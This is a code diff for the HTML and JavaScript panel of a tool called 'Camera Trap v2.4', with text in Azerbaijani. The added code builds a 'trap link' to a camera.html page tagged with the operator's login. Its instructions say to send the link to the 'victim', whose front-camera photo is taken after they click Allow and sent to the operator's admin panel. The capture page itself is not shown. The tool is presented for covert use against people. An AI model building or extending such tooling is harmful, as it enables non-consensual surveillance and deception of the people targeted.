@@ -1,10 +1,28 @@
-<div style="background: rgba(17, 20, 29, 0.95); padding: 30px; border-radius: 25px; border: 1px solid var(--red);">
-    <h2 style="color:var(--red); margin:0;">Camera Trap</h2>
-    <button class="btn" style="background:var(--red); color:white;" onclick="copyL()">TƏLƏ LİNKİNİ KOPYALA</button>
+<div class="tool-container" style="animation: fadeIn 0.5s ease; color: white; text-align: center;">
+    <h2 style="color: #ff3e3e;"><i class="fas fa-camera"></i> Camera Trap v2.4</h2>
+    <p style="font-size: 0.8rem; color: #888;">Qurbanın şəklini çəkmək üçün xüsusi link yaradın.</p>
+
+    <div style="background: rgba(255,62,62,0.05); border: 1px solid #ff3e3e; padding: 20px; border-radius: 15px; margin: 20px 0;">
+        <div id="trap-link-box" style="font-family: monospace; font-size: 0.8rem; color: #ff3e3e; word-break: break-all; margin-bottom: 15px;">
+            Link hazırlanmayıb...
+        </div>
+        <button class="btn" style="background: #ff3e3e; color: white;" onclick="generateTrapLink()">
+            TƏLƏ LİNKİNİ YARAT
+        </button>
+    </div>
+
+    <div style="text-align: left; font-size: 0.75rem; color: #666;">
+        <b>Təlimat:</b> Linki kopyalayın və qurbana göndərin. O, linkə daxil olub "İcazə Ver" (Allow) düyməsinə basdıqda ön kameradan şəkil çəkilərək <b>ww24.html</b> (Admin) panelinizə göndəriləcək.
+    </div>
 </div>
+
 <script>
-    function copyL() {
-        const link = window.location.origin + "/trap.html?ref=" + loginName;
-        navigator.clipboard.writeText(link); alert("Kopyalandı!");
+    function generateTrapLink() {
+        // Dinamik olaraq cari URL-dən tələ səhifəsinin linkini yaradır
+        let baseUrl = window.location.href.split('index.html')[0];
+        let finalLink = baseUrl + "camera.html?ref=" + loginName; 
+        document.getElementById('trap-link-box').innerText = finalLink;
+        navigator.clipboard.writeText(finalLink);
+        alert("Link kopyalandı! Onu qurbana göndərin.");
     }
 </script>
